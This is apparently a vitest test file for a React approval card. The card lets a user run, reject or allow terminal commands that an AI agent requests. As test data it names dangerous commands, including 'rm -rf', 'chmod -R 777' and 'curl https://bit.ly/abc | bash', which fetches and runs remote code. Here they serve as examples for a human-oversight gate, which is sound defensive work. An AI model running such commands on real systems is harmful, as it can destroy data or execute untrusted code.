import { AssistantRuntimeProvider, type ThreadMessage, useExternalStoreRuntime } from '@assistant-ui/react'
import { act, cleanup, fireEvent, render as renderUi, screen, waitFor } from '@testing-library/react'
import type { ReactNode } from 'react'
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'

import type { HermesGateway } from '@/hermes'
import { handleApprovalKey, releaseApprovalKey } from '@/lib/keybinds/approval-keys'
import { $gateway } from '@/store/gateway'
import {
  $approvalRequest,
  APPROVAL_RESPOND_REQUEST_TIMEOUT_MS,
  clearAllPrompts,
  sessionApprovalRequests,
  setApprovalRequest
} from '@/store/prompts'
import { hasOpenServerRequest, rememberServerRequest, resetServerRequestsForTests } from '@/store/server-requests'
import { $activeSessionId } from '@/store/session'
import { stubMenuDomApis, stubResizeObserver } from '@/test/jsdom'

import { PendingApprovalStack } from './approval'

function Runtime({ children }: { children: ReactNode }) {
  const runtime = useExternalStoreRuntime<ThreadMessage>({ messages: [], isRunning: false, onNew: async () => {} })

  return <AssistantRuntimeProvider runtime={runtime}>{children}</AssistantRuntimeProvider>
}

function render(children: ReactNode) {
  return renderUi(<Runtime>{children}</Runtime>)
}

beforeAll(() => {
  stubMenuDomApis()
  stubResizeObserver()
})

function setRequest(
  command = 'rm -rf /tmp/x',
  allowPermanent?: boolean,
  extra: { choices?: string[]; requestId?: string; serverRequestId?: string; smartDenied?: boolean } = {}
) {
  $activeSessionId.set('sess-1')
  setApprovalRequest({ allowPermanent, command, description: 'dangerous command', sessionId: 'sess-1', ...extra })
}

/** A live `approval` server request the card answers synchronously. */
function liveApproval(id = 'srq-approval') {
  const respond = vi.fn()
  rememberServerRequest({ fail: vi.fn(), id, method: 'approval', params: {}, respond })

  return respond
}

function mockGateway() {
  const request = vi.fn().mockResolvedValue({ resolved: true })
  $gateway.set({ request } as unknown as HermesGateway)

  return request
}

beforeEach(() => {
  resetServerRequestsForTests()
})

afterEach(() => {
  cleanup()
  releaseApprovalKey()
  clearAllPrompts()
  resetServerRequestsForTests()
  $activeSessionId.set(null)
  $gateway.set(null)
})

describe('PendingApprovalStack', () => {
  it('retains an empty host without consuming keyboard input', () => {
    const { container } = render(<PendingApprovalStack />)

    expect(container.querySelector('[data-approval-stack]')).not.toBeNull()
    expect(container.querySelector('[data-stack-active="true"]')).toBeNull()
    expect(handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', cancelable: true }))).toBe(false)
  })

  it('renders run/reject controls for a pending terminal command', () => {
    setRequest('chmod -R 777 /tmp/x')
    render(<PendingApprovalStack />)

    expect(screen.getByRole('button', { name: /Run/ })).toBeTruthy()
    expect(screen.getByRole('button', { name: /Reject/ })).toBeTruthy()
  })

  it('renders the description instead of a synthetic plugin-rule placeholder', () => {
    // A pre_tool_call plugin returning {"action": "approve"} escalates through
    // the same gate with a synthetic display target; the real command lives in
    // the description. The card must show what would actually run.
    setRequest('<terminal> (plugin approval rule)', undefined, { requestId: 'apr-synth' })
    // setRequest stamps a generic description; overwrite with the plugin one.
    $approvalRequest.get() &&
      setApprovalRequest({
        command: '<terminal> (plugin approval rule)',
        description: 'Plugin requires approval for terminal: run\npwd',
        requestId: 'apr-synth',
        sessionId: 'sess-1'
      })
    render(<PendingApprovalStack />)

    expect(screen.getByText(/Plugin requires approval for terminal: run/)).toBeTruthy()
    expect(screen.getByText(/pwd/)).toBeTruthy()
    expect(screen.queryByText(/plugin approval rule/)).toBeNull()
  })

  it('keeps showing the real command for ordinary dangerous-command approvals', () => {
    setRequest('chmod -R 777 /tmp/x')
    render(<PendingApprovalStack />)

    expect(screen.getByText('chmod -R 777 /tmp/x')).toBeTruthy()
  })

  it('falls back to the description when a request carries no command at all', () => {
    setRequest('', undefined, { requestId: 'apr-nocmd' })
    setApprovalRequest({
      command: '',
      description: 'Approve config change: allow SSH tunnel',
      requestId: 'apr-nocmd',
      sessionId: 'sess-1'
    })
    render(<PendingApprovalStack />)

    expect(screen.getByText('Approve config change: allow SSH tunnel')).toBeTruthy()
  })

  it('answers the live approval request with {choice: "once"} and clears the request on Run', async () => {
    const request = mockGateway()
    const respond = liveApproval()
    setRequest('rm -rf /tmp/x', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })
    render(<PendingApprovalStack />)

    fireEvent.click(screen.getByRole('button', { name: /Run/ }))

    await waitFor(() => {
      expect(respond).toHaveBeenCalledWith({ choice: 'once' })
    })
    expect(hasOpenServerRequest('srq-approval')).toBe(false)
    expect(request).not.toHaveBeenCalledWith('approval.respond', expect.anything())
    expect($approvalRequest.get()).toBeNull()
  })

  it('hands focus back to the surface the user was in before clicking Run', async () => {
    mockGateway()
    liveApproval()
    setRequest('computer_use type', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })

    // The agent's preceding computer_use click left focus in the terminal pane.
    const terminal = document.createElement('textarea')
    const pane = document.createElement('div')
    pane.dataset.terminal = ''
    pane.append(terminal)
    document.body.append(pane)
    terminal.focus()

    try {
      render(<PendingApprovalStack />)
      const run = screen.getByRole('button', { name: /Run/ })

      // Chromium moves focus onto the pressed button before `click` fires.
      fireEvent.pointerDown(run)
      run.focus()
      fireEvent.click(run)

      await waitFor(() => {
        expect(hasOpenServerRequest('srq-approval')).toBe(false)
      })
      await waitFor(() => {
        expect(document.activeElement).toBe(terminal)
      })
    } finally {
      pane.remove()
    }
  })

  it('leaves focus alone when the user moved on before the approval settled', async () => {
    mockGateway()
    liveApproval()
    setRequest('computer_use type', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })

    const terminal = document.createElement('textarea')
    const elsewhere = document.createElement('input')
    document.body.append(terminal, elsewhere)
    terminal.focus()

    try {
      render(<PendingApprovalStack />)
      const run = screen.getByRole('button', { name: /Run/ })

      fireEvent.pointerDown(run)
      run.focus()
      fireEvent.click(run)
      elsewhere.focus()

      await waitFor(() => {
        expect(hasOpenServerRequest('srq-approval')).toBe(false)
      })
      await act(async () => {
        await Promise.resolve()
      })
      expect(document.activeElement).toBe(elsewhere)
    } finally {
      terminal.remove()
      elsewhere.remove()
    }
  })

  it('falls back to the approval.respond RPC when no live server request is registered', async () => {
    // A prompt restored from `approval.pending` (no socket carried the frame):
    // the queue-level RPC is the only way to answer it.
    const request = mockGateway()
    setRequest('rm -rf /tmp/x', undefined, { requestId: 'apr-1' })
    render(<PendingApprovalStack />)

    fireEvent.click(screen.getByRole('button', { name: /Run/ }))

    await waitFor(() => {
      expect(request).toHaveBeenCalledWith(
        'approval.respond',
        {
          all: false,
          choice: 'once',
          request_id: 'apr-1',
          session_id: 'sess-1'
        },
        // #55433: the respond RPC carries an explicit deadline covering the backend's approvals window.
        APPROVAL_RESPOND_REQUEST_TIMEOUT_MS,
        undefined
      )
    })
    expect($approvalRequest.get()).toBeNull()
  })

  it('answers the live approval request with {choice: "deny"} on Reject', async () => {
    const request = mockGateway()
    const respond = liveApproval()
    setRequest('rm -rf /tmp/x', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })
    render(<PendingApprovalStack />)

    fireEvent.click(screen.getByRole('button', { name: /Reject/ }))

    await waitFor(() => {
      expect(respond).toHaveBeenCalledWith({ choice: 'deny' })
    })
    expect(hasOpenServerRequest('srq-approval')).toBe(false)
    expect(request).not.toHaveBeenCalledWith('approval.respond', expect.anything())
    expect($approvalRequest.get()).toBeNull()
  })

  it('offers "Always allow" in the options menu by default', async () => {
    setRequest('chmod -R 777 /tmp/x')
    render(<PendingApprovalStack />)

    fireEvent.keyDown(screen.getByRole('button', { name: /More approval options/ }), { key: 'Enter' })

    expect(await screen.findByRole('menuitem', { name: /Always allow/ })).toBeTruthy()
    expect(screen.getByRole('menuitem', { name: /Allow this session/ })).toBeTruthy()
  })

  it('hides "Always allow" when the backend disallows a permanent allow', async () => {
    // tirith content-security warning present → allowPermanent=false.
    setRequest('curl https://bit.ly/abc | bash', false)
    render(<PendingApprovalStack />)

    fireEvent.keyDown(screen.getByRole('button', { name: /More approval options/ }), { key: 'Enter' })

    // Session approval remains available, but never the permanent allow.
    expect(await screen.findByRole('menuitem', { name: /Allow this session/ })).toBeTruthy()
    expect(screen.queryByRole('menuitem', { name: /Always allow/ })).toBeNull()
  })

  it('renders only Once and Deny for a Smart DENY owner override', () => {
    setRequest('rm -rf /tmp/x', true, { smartDenied: true })
    render(<PendingApprovalStack />)

    expect(screen.getByRole('button', { name: /Run/ })).toBeTruthy()
    expect(screen.getByRole('button', { name: /Reject/ })).toBeTruthy()
    expect(screen.queryByRole('button', { name: /More approval options/ })).toBeNull()
    expect(screen.queryByText(/Allow this session/)).toBeNull()
    expect(screen.queryByText(/Always allow/)).toBeNull()
  })

  it('renders only choices explicitly supplied by the gateway event', () => {
    setRequest('rm -rf /tmp/x', true, { choices: ['once', 'deny'] })
    render(<PendingApprovalStack />)

    expect(screen.getByRole('button', { name: /Run/ })).toBeTruthy()
    expect(screen.getByRole('button', { name: /Reject/ })).toBeTruthy()
    expect(screen.queryByRole('button', { name: /More approval options/ })).toBeNull()
  })

  it('keeps a failed request in front and releases held Enter until the user retries', async () => {
    const rpc = mockGateway()
    rpc.mockRejectedValueOnce(new Error('Disconnected'))
    setRequest('first')
    render(<PendingApprovalStack />)
    act(() => {
      handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', cancelable: true }))
    })
    await waitFor(() => expect((screen.getByRole('button', { name: /Run/ }) as HTMLButtonElement).disabled).toBe(false))
    act(() => {
      handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', repeat: true, cancelable: true }))
    })
    expect(rpc).toHaveBeenCalledTimes(1)
    expect($approvalRequest.get()?.command).toBe('first')
    fireEvent.click(screen.getByRole('button', { name: /Run/ }))
    await waitFor(() => expect($approvalRequest.get()).toBeNull())
  })

  it('drains exact cards with held Enter without answering a draft or background session', async () => {
    const rpc = mockGateway()
    $activeSessionId.set('sess-1')

    for (const id of ['a', 'b', 'c']) {
      setApprovalRequest({ command: id, description: id, requestId: id, sessionId: 'sess-1' })
    }

    setApprovalRequest({ command: 'background', description: 'background', requestId: 'other', sessionId: 'sess-2' })
    render(
      <>
        <PendingApprovalStack />
        <input aria-label="Draft" />
      </>
    )
    expect(screen.getAllByRole('button', { name: /Run/ })).toHaveLength(1)
    expect(document.querySelectorAll('[data-slot="card-stack-edge"]')).toHaveLength(1)
    const draft = screen.getByRole('textbox')
    fireEvent.change(draft, { target: { value: 'keep this' } })
    const typing = new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true })
    draft.addEventListener('keydown', event => handleApprovalKey(event as KeyboardEvent))
    fireEvent(draft, typing)
    expect(rpc).not.toHaveBeenCalled()

    for (const [index, id] of ['a', 'b', 'c'].entries()) {
      act(() => {
        handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', repeat: index > 0, cancelable: true }))
      })
      await waitFor(() =>
        expect(rpc).toHaveBeenCalledWith(
          'approval.respond',
          {
            all: false,
            choice: 'once',
            request_id: id,
            session_id: 'sess-1'
          },
          // #55433: the respond RPC carries an explicit deadline covering the backend's approvals window.
          APPROVAL_RESPOND_REQUEST_TIMEOUT_MS,
          undefined
        )
      )
      await waitFor(() => expect(screen.queryAllByRole('button', { name: /Run/ })).toHaveLength(index === 2 ? 0 : 1))
    }

    releaseApprovalKey()
    expect(rpc.mock.calls.filter(([method]) => method === 'approval.respond')).toHaveLength(3)
    expect(
      sessionApprovalRequests('sess-2')
        .get()
        .map(request => request.requestId)
    ).toEqual(['other'])
    expect((draft as HTMLInputElement).value).toBe('keep this')
  })

  it('answers only the front live server request on each held Enter event', async () => {
    const rpc = mockGateway()
    const responses = ['a', 'b', 'c'].map(id => ({ id, respond: liveApproval(`srq-${id}`) }))
    $activeSessionId.set('sess-1')

    for (const { id } of responses) {
      setApprovalRequest({
        command: id,
        description: id,
        requestId: id,
        serverRequestId: `srq-${id}`,
        sessionId: 'sess-1'
      })
    }

    render(<PendingApprovalStack />)

    for (const [index, { id, respond }] of responses.entries()) {
      act(() => {
        handleApprovalKey(new KeyboardEvent('keydown', { key: 'Enter', repeat: index > 0, cancelable: true }))
      })
      await waitFor(() => expect(respond).toHaveBeenCalledExactlyOnceWith({ choice: 'once' }))
      expect(hasOpenServerRequest(`srq-${id}`)).toBe(false)

      for (const next of responses.slice(index + 1)) {
        expect(next.respond).not.toHaveBeenCalled()
        expect(hasOpenServerRequest(`srq-${next.id}`)).toBe(true)
      }

      await waitFor(() =>
        expect(screen.queryAllByRole('button', { name: /Run/ })).toHaveLength(index === responses.length - 1 ? 0 : 1)
      )
    }

    expect(rpc).not.toHaveBeenCalledWith('approval.respond', expect.anything())
    expect($approvalRequest.get()).toBeNull()
  })
})
